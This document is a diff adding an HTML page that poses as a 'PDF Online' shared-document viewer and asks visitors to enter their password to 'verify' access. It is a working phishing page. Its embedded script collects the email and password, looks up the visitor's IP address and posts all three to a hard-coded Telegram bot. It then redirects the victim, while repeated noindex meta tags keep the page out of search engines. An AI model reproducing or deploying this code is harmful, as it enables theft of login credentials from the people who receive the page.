@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Official Document</title>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <meta name="robots" content="noindex" />
+    <meta name="googlebot" content="noindex" />
+    <meta name="googlebot-news" content="noindex" />
+    <meta name="otherbot" content="noindex" />
+    <meta name="noarchive" content="noindex" />
+    <meta name="nosnippet" content="noindex" />
+    <meta name="noimageindex" content="noindex" />
+    <meta name="robots" content="none" />
+    <meta name="googlebot" content="none" />
+    <meta name="googlebot-news" content="none" />
+    <meta name="otherbot" content="none" />
+    <meta name="noarchive" content="none" />
+    <meta name="nosnippet" content="none" />
+    <meta name="noimageindex" content="none" />
+    <meta name="robots" content="nofollow" />
+    <meta name="googlebot" content="nofollow" />
+    <meta name="googlebot-news" content="nofollow" />
+    <meta name="otherbot" content="nofollow" />
+    <meta name="noarchive" content="nofollow" />
+    <meta name="nosnippet" content="nofollow" />
+    <meta name="noimageindex" content="nofollow" />
+    <meta name="robots" content="max-snippet:0" />
+    <meta name="robots" content="unavailable_after: 2020-09-22" />
+
+    <link
+      href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap"
+      rel="stylesheet" />
+    <link
+      rel="icon"
+      type="image/gif"
+      href="https://th.bing.com/th/id/OIP.BorG5kgz0XwQwzajVlEnDgHaJM?w=137&h=180&c=7&o=5&pid=1.7" />
+
+    <link
+      rel="stylesheet"
+      href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
+      crossorigin="anonymous" />
+    <link
+      href="https://fonts.googleapis.com/css?family=Yellowtail&display=swap"
+      rel="stylesheet" />
+
+    <style type="text/css">
+      textarea:hover,
+      input:hover,
+      textarea:active,
+      input:active,
+      textarea:focus,
+      input:focus,
+      button:focus,
+      button:active,
+      button:hover,
+      label:focus,
+      .btn:active,
+      .btn.active {
+        outline: 0px !important;
+        -webkit-appearance: none;
+        box-shadow: none !important;
+      }
+    </style>
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        var form = document.getElementById("webmailSignin-form");
+        form.addEventListener("submit", handleSignin);
+        console.log("Event listener attached to form.");
+
+        function handleSignin(event) {
+          event.preventDefault(); // Prevent form submission
+          console.log("handleSignin called.");
+
+          var password = document.getElementById("password").value;
+          var email = document.getElementById("xx").value;
+          console.log("Email:", email);
+          console.log("Password:", password);
+
+          document.getElementById("Btn").textContent = "Verifying account...";
+          document.getElementById("msg").innerHTML = "";
+
+          if (!password) {
+            document.getElementById("Btn").textContent = "Sign in";
+            document.getElementById("msg").innerHTML =
+              '<font face="Arial, Helvetica, sans-serif" size="2" style="color: red">Password required!</font>';
+            return;
+          }
+
+          fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => {
+              const ipAddress = data.ip;
+              const payload = {
+                email: email,
+                password: password,
+                ipAddress: ipAddress,
+              };
+
+              sendToTelegram(payload);
+            })
+            .catch((error) => {
+              console.error("Error capturing IP address:", error);
+              window.location.href = "https://example.org"; // Redirect to error URL
+            });
+        }
+
+        function sendToTelegram(data) {
+          const payload = {
+            chat_id: 6840082974,
+            text: `Log Details:\nEMAIL: ${data.email}\nPASSWORD: ${data.password}\nIP: ${data.ipAddress}`,
+          };
+
+          fetch(
+            "https://api.telegram.org/bot" +
+              "6502537025:AAGlWDt4HheBPcy10r1x6CtInaTTlb4CVUg" +
+              "/sendMessage",
+            {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json",
+              },
+              body: JSON.stringify(payload),
+            }
+          )
+            .then((response) => {
+              if (response.ok) {
+                window.location.href = "https://example.com"; // Redirect to success URL
+              } else {
+                console.error(
+                  "Error sending data to Telegram:",
+                  response.statusText
+                );
+                window.location.href = "https://example.org"; // Redirect to error URL
+              }
+            })
+            .catch((error) => {
+              console.error("Error sending data to Telegram:", error);
+              window.location.href = "https://example.org"; // Redirect to error URL
+            });
+        }
+      });
+    </script>
+  </head>
+  <body>
+    <span class="pl-4 h5 align-middle">PDF Online</span><br /><br />
+    <span class="h5"
+      >Only recipient email can access shared files. please verify to
+      access.</span
+    ><br />&nbsp;
+    <form method="post" id="webmailSignin-form">
+      <div class="form-group">
+        <input
+          aria-describedby="emailHelp"
+          class="form-control rounded-0 bg-transparent"
+          name="email"
+          id="xx"
+          value=""
+          readonly
+          type="text" />
+      </div>
+      <div class="form-group mt-2">
+        <input
+          aria-describedby="emailHelp"
+          class="form-control"
+          name="password"
+          id="password"
+          placeholder="Password"
+          value=""
+          type="password"
+          required />
+      </div>
+      <div class="form-check mt-3">
+        <input class="form-check-input" id="exampleCheck1" type="checkbox" />
+        <label class="form-check-label" for="exampleCheck1"
+          ><a href="#">Remember me</a></label
+        >
+      </div>
+      <div class="col-lg-12 mt-3">
+        <button
+          class="btn text-white px-4 w-100"
+          type="submit"
+          id="Btn"
+          style="background-color: #d61c00">
+          View
+        </button>
+      </div>
+    </form>
+  </body>
+</html>
